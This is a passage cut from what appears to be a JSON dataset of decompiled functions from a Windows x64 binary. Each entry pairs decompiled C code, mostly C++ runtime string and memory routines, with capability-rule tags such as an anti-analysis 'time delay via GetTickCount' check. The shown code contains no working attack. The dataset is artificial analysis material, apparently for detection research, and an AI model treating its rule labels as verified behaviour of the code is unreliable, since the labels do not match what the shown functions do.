(puVar6 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    return puVar6;\n}\n",
        "token_count": 1722
    },
    "1400a608": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a6080(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t arg2_00;\n    \n    arg2_00 = arg1[1];\n    if (arg2 <= arg2_00) {\n        if (arg2 < arg2_00) {\n            arg1[1] = arg2;\n            *(*arg1 + arg2 * 2) = 0;\n        }\n        return;\n    }\n    fcn.1400a5030(arg1, arg2_00, 0, arg2 - arg2_00);\n    return;\n}\n",
        "token_count": 133
    },
    "1400a6b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400a6b00(ulong *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ushort *puVar3;\n    uint64_t arg3;\n    uint64_t auStackX16 [3];\n    \n    if (arg1 + 2 == *arg1) {\n        arg3 = 7;\n    }\n    else {\n        arg3 = arg1[2];\n    }\n    if (arg2 <= arg3) {\n        return;\n    }\n    auStackX16[0] = arg2;\n    puVar3 = fcn.1400a6d90(arg1, auStackX16, arg3);\n    puVar2 = *arg1;\n    iVar1 = arg1[1] + 1;\n    if (arg1[1] == 0) {\n        *puVar3 = *puVar2;\n    }\n    else if (iVar1 != 0) {\n        sub.msvcrt.dll_memcpy(puVar3, puVar2, iVar1 * 2);\n    }\n    if (arg1 + 2 != puVar2) {\n        fcn.1400b64d0(puVar2);\n    }\n    *arg1 = puVar3;\n    arg1[2] = auStackX16[0];\n    return;\n}\n",
        "token_count": 294
    },
    "1400a6d9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.1400a6d90(ulong noname_0, uint64_t *arg2, uint64_t arg3)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    ulong uVar3;\n    char cVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    code *pcVar7;\n    int64_t *piVar8;\n    int64_t **ppiVar9;\n    ulong arg1;\n    char *pcVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    ulong *puVar13;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    uVar11 = *arg2;\n    if (0x1fffffffffffffff < uVar11) {\n        pcVar10 = \"basic_string::_M_create\";\n        puVar6 = fcn.1400b7170(\"basic_string::_M_create\");\n        *(pcVar10 + 8) = arg2;\n        return puVar6;\n    }\n    if ((arg3 < uVar11) && (arg3 = arg3 * 2,  uVar11 < arg3)) {\n        if (0x1fffffffffffffff < arg3) {\n            iVar12 = 0x4000000000000000;\n            *arg2 = 0x1fffffffffffffff;\n            goto code_r0x0001400b6520;\n        }\n        *arg2 = arg3;\n        uVar11 = arg3;\n    }\n    iVar12 = (uVar11 + 1) * 2;\ncode_r0x0001400b6520:\n    iVar5 = 1;\n    if (iVar12 != 0) {\n        iVar5 = iVar12;\n    }\n    while( true ) {\n        puVar6 = sub.msvcrt.dll_malloc(iVar5);\n        if (puVar6 != NULL) {\n            return puVar6;\n        }\n        pcVar7 = fcn.1400b05d0();\n        if (pcVar7 == NULL) break;\n        (*pcVar7)();\n    }\n    piVar8 = fcn.1400b6600(8);\n    *piVar8 = *0x140103570 + 0x10;\n    fcn.1400b6bc0(piVar8, 0x1401063b0, fcn.1400ae670);\n    puVar6 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar6 == NULL) {\n        iVar12 = 0x90;\n        puVar6 = fcn.14001a310(0x90);\n        if (puVar6 == NULL) {\n            fcn.1400b2e40();\n            piVar8 = iVar12 + 0xa0;\n            puVar6 = sub.msvcrt.dll_malloc();\n            if ((puVar6 != NULL) || (puVar6 = fcn.14001a310(piVar8),  puVar6 != NULL)) {\n                *puVar6 = 0;\n                puVar6[0x13] = 0;\n                puVar13 = puVar6 + 1 & 0xfffffffffffffff8;\n                for (uVar11 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar11 != 0;\n                    uVar11 = uVar11 - 1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n                return puVar6 + 0x14;\n            }\n            fcn.1400b2e40();\n            ppiVar9 = fcn.1400b6970();\n            piVar1 = piVar8 + -10;\n            piStack240 = *ppiVar9;\n            if (*piVar8 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar8 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar8 + -5) = iVar2 + 1;\n                *(ppiVar9 + 1) = *(ppiVar9 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar8[-6] = piStack240;\n                    *ppiVar9 = piVar1;\n                }\n                return piVar8[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar9 = piVar1;\n                return NULL;\n            }\n            fcn.1400b2e40();\n            if ((piStack240 == NULL) || (fcn.1400b6670(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b2e40();\n            }\n            iVar12 = piStack240[-7];\n            fcn.140019910();\n            fcn.1400b6670(iVar12);\n            uStack272 = *(iVar12 + -0x10);\n            arg2_00 = *(iVar12 + -0x18);\n            iVar2 = *(iVar12 + -0x24);\n            uVar3 = *(iVar12 + -0x38);\n            arg1 = fcn.140019930(*(iVar12 + -0x40));\n            fcn.1400b6670(arg1);\n            piVar8 = fcn.1400b6980();\n            puVar6 = *piVar8;\n            if ((*(puVar6 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n            puVar6 = *puVar6;\n            while( true ) {\n                fcn.140019500(0, arg2_00, auStack288);\n                cVar4 = fcn.1400195f0(auStack288, puVar6[-0x12], puVar6, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar6 = 0x140105740;\n                cVar4 = fcn.1400195f0(auStack288, 0x140105740, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400b680d;\n                piVar8 = fcn.1400b6600(8);\n                *piVar8 = *0x1401032a0 + 0x10;\n                fcn.1400b6bc0(piVar8, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n                puVar6 = puVar6 + 0x12;\n            }\n            fcn.1400b6b70();\ncode_r0x0001400b680d:\n            fcn.140019910(uVar3);\n            ppiVar9 = fcn.1400b6970();\n            piVar8 = *ppiVar9;\n            if (piVar8 != NULL) {\n                if ((*(piVar8 + 10) & 1) != 0) {\n                    piVar8 = *piVar8 + -0x90;\n                }\n                piVar8 = *piVar8;\n            }\n            return piVar8;\n        }\n    }\n    *puVar6 = 0;\n    puVar6[0x11] = 0;\n    puVar13 = puVar6 + 1 & 0xfffffffffffffff8;\n    for (uVar11 = (puVar6 - (puVar6 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar11 != 0; uVar11 = uVar11 - 1) {\n        *puVar13 = 0;\n        puVar13 = puVar13 + 1;\n    }\n    return puVar6;\n}\n",
        "token_count": 1744
    },
    "1400b000": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuchar * fcn.1400b0000(uchar *arg1, ulong arg2, uint8_t *arg3, int64_t arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uchar *puVar6;\n    uint64_t uVar7;\n    uint8_t *puVar8;\n    int64_t iVar9;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    iVar2 = *arg3;\n    if ((*arg3 - 1 < 0x7e) && (iVar2 < in_stack_00000030 - in_stack_00000028)) {\n        iVar9 = 0;\n        uVar5 = 0;\n        do {\n            in_stack_00000030 = in_stack_00000030 - iVar2;\n            if (uVar5 < arg4 - 1U) {\n                uVar5 = uVar5 + 1;\n            }\n            else {\n                iVar9 = iVar9 + 1;\n            }\n            puVar8 = arg3 + uVar5;\n            iVar2 = *puVar8;\n        } while ((*puVar8 - 1 < 0x7e) && (iVar2 < in_stack_00000030 - in_stack_00000028));\n        iVar2 = iVar9 + -1;\n        uVar7 = uVar5 - 1;\n        if (in_stack_00000028 == in_stack_00000030) goto joined_r0x0001400b00b9;\n    }\n    else {\n        if (in_stack_00000030 == in_stack_00000028) {\n            return arg1;\n        }\n        uVar7 = 0xffffffffffffffff;\n        iVar9 = 0;\n        uVar5 = 0;\n        iVar2 = -1;\n        puVar8 = arg3;\n    }\n    iVar3 = 0;\n    do {\n        arg1[iVar3] = *(in_stack_00000028 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != in_stack_00000030 - in_stack_00000028);\n    arg1 = arg1 + iVar3;\njoined_r0x0001400b00b9:\n    while (iVar3 = iVar2,  iVar9 != 0) {\n        *arg1 = arg2;\n        uVar1 = *puVar8;\n        puVar6 = arg1 + 1;\n        if ('\\0' < uVar1) {\n            uVar4 = 0;\n            do {\n                arg1[uVar4 + 1] = *(in_stack_00000030 + uVar4);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 != uVar1);\n            in_stack_00000030 = in_stack_00000030 + uVar4;\n            puVar6 = puVar6 + uVar4;\n        }\n        arg1 = puVar6;\n        iVar2 = iVar3 + -1;\n        iVar9 = iVar3;\n    }\n    while (uVar4 = uVar7,  uVar5 != 0) {\n        *arg1 = arg2;\n        uVar7 = arg3[uVar4];\n        puVar6 = arg1 + 1;\n        if ('\\0' < arg3[uVar4]) {\n            uVar5 = 0;\n            do {\n                arg1[uVar5 + 1] = *(in_stack_00000030 + uVar5);\n                uVar5 = uVar5 + 1;\n            } while (uVar7 != uVar5);\n            in_stack_00000030 = in_stack_00000030 + uVar7;\n            puVar6 = puVar6 + uVar7;\n        }\n        arg1 = puVar6;\n        uVar7 = uVar4 - 1;\n        uVar5 = uVar4;\n    }\n    return arg1;\n}\n",
        "token_count": 880
    },
    "1400b019": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nushort * fcn.1400b0190(ushort *arg1, ulong arg2, uint8_t *arg3, int64_t arg4)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint8_t *puVar7;\n    int64_t iVar8;\n    ushort *puVar9;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    iVar4 = *arg3;\n    if ((iVar4 < in_stack_00000030 - in_stack_00000028 >> 1) && (*arg3 - 1 < 0x7e)) {\n        uVar6 = 0;\n        iVar8 = 0;\n        do {\n            in_stack_00000030 = in_stack_00000030 + iVar4 * -2;\n            if (uVar6 < arg4 - 1U) {\n                uVar6 = uVar6 + 1;\n            }\n            else {\n                iVar8 = iVar8 + 1;\n            }\n            puVar7 = arg3 + uVar6;\n            iVar4 = *puVar7;\n        } while ((iVar4 < in_stack_00000030 - in_stack_00000028 >> 1) && (*puVar7 - 1 < 0x7e));\n        iVar4 = iVar8 + -1;\n        uVar5 = uVar6 - 1;\n        if (in_stack_00000028 == in_stack_00000030) goto joined_r0x0001400b0251;\n    }\n    else {\n        if (in_stack_00000030 == in_stack_00000028) {\n            return arg1;\n        }\n        uVar5 = 0xffffffffffffffff;\n        iVar8 = 0;\n        uVar6 = 0;\n        iVar4 = -1;\n        puVar7 = arg3;\n    }\n    iVar3 = 0;\n    do {\n        *(arg1 + iVar3) = *(in_stack_00000028 + iVar3);\n        iVar3 = iVar3 + 2;\n    } while (in_stack_00000030 - in_stack_00000028 != iVar3);\n    arg1 = (in_stack_00000030 - in_stack_00000028) + arg1;\njoined_r0x0001400b0251:\n    while (iVar3 = iVar4,  iVar8 != 0) {\n        *arg1 = arg2;\n        uVar1 = *puVar7;\n        puVar9 = arg1 + 1;\n        if ('\\0' < uVar1) {\n            iVar4 = uVar1 * 2;\n            iVar8 = 0;\n            do {\n                *(arg1 + iVar8 + 2) = *(in_stack_00000030 + iVar8);\n                iVar8 = iVar8 + 2;\n            } while (iVar4 != iVar8);\n            in_stack_00000030 = in_stack_00000030 + iVar4;\n            puVar9 = puVar9 + uVar1;\n        }\n        iVar4 = iVar3 + -1;\n        arg1 = puVar9;\n        iVar8 = iVar3;\n    }\n    while (uVar2 = uVar5,  uVar6 != 0) {\n        *arg1 = arg2;\n        uVar1 = arg3[uVar2];\n        puVar9 = arg1 + 1;\n        if ('\\0' < uVar1) {\n            iVar4 = 0;\n            do {\n                *(arg1 + iVar4 + 2) = *(in_stack_00000030 + iVar4);\n                iVar4 = iVar4 + 2;\n            } while (iVar4 != uVar1 * 2);\n            in_stack_00000030 = in_stack_00000030 + iVar4;\n            puVar9 = puVar9 + iVar4;\n        }\n        uVar5 = uVar2 - 1;\n        arg1 = puVar9;\n        uVar6 = uVar2;\n    }\n    return arg1;\n}\n",
        "token_count": 902
    },
    "1400b18e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.1400b18e0(int64_t arg1, int64_t arg2, char *arg3, int64_t arg4)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    bool bVar6;\n    \n    uVar4 = arg4 - 1;\n    uVar3 = arg2 - 1U;\n    if (uVar4 < arg2 - 1U) {\n        uVar3 = uVar4;\n    }\n    if (uVar3 == 0) {\n        bVar6 = true;\n    }\n    else {\n        uVar5 = 0;\n        do {\n            bVar6 = arg3[uVar4] == *(arg1 + uVar5);\n            uVar5 = uVar5 + 1;\n            uVar4 = uVar4 - 1;\n            if (uVar3 <= uVar5) break;\n        } while (bVar6);\n    }\n    cVar2 = *(arg1 + uVar3);\n    while ((uVar4 != 0 && (bVar6 != false))) {\n        pcVar1 = arg3 + uVar4;\n        uVar4 = uVar4 - 1;\n        bVar6 = *pcVar1 == cVar2;\n    }\n    if (cVar2 - 1U < 0x7e) {\n        bVar6 = bVar6 & (*arg3 == cVar2 || *arg3 < cVar2);\n    }\n    return bVar6;\n}\n",
        "token_count": 352
    },
    "1400b260": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b2600(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(*0x140102d10);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x140106020, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 189
    },
    "1400b266": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b2660(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(*0x140102d20);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x140106060, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 189
    },
    "1400b26c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b26c0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x140106100, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 190
    },
    "1400b272": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b2720(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x140106120, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 189
    },
    "1400b284": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b2840(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(0x1400fb900);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x140106180, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 189
    },
    "1400b28a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b28a0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(0x1400fb910);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x1401061a0, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 192
    },
    "1400b290": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b2900(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(0x1400fb920);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x1401061c0, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 191
    },
    "1400b296": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.1400b2960(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar1 = fcn.1400261c0(0x1400fb930);\n    uVar3 = 0;\n    if ((uVar1 < *(*arg1 + 0x10)) && (uVar1 = *(*(*arg1 + 8) + uVar1 * 8),  uVar1 != 0)) {\n        iVar2 = fcn.1400b6c10(uVar1, 0x140104f20, 0x1401061e0, 0);\n        uVar3 = uVar1 & 0xffffffffffffff00 | iVar2 != 0;\n    }\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 191
    },
    "1400b2e4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b2e40(void)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    piVar2 = **0x140102a90;\n    fcn.140019910();\n    uVar1 = fcn.1400261c0(0x1400fb780);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140104f30, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb790);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140104f70, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb7a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140104fb0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb7b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140104ff0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb7c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401051b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb7d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401051d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb7e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401051f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb7f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb800);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb810);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105290, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb820);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401052b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb830);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401052f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb840);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb850);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105350, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb860);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb870);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb3f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401054d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb400);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb410);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140105550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb420);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140105590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb430);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else 